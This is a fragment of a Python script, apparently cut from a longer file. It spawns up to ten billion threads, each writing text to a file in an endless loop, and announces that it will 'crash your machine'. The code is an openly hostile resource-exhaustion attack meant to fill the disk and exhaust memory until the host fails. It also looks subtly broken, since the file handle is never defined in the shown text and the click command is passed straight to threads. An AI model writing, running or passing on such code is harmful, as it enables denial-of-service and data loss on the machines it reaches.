...
@click.command()
def spam_disk_ram(index):
    try:
        click.echo(f'Thread {index} startted to crash your machine :)')
        while True:
            fileo.write("Hello World!\n"*(2**5))
    except KeyboardInterrupt:
        pass
    except:
        click.echo('SKIPPING ERRORS')
        fileo.close()


for j in range(0, 10000000001):
    threading.Thread(target=spam_disk_ram, args=[j,]).start()
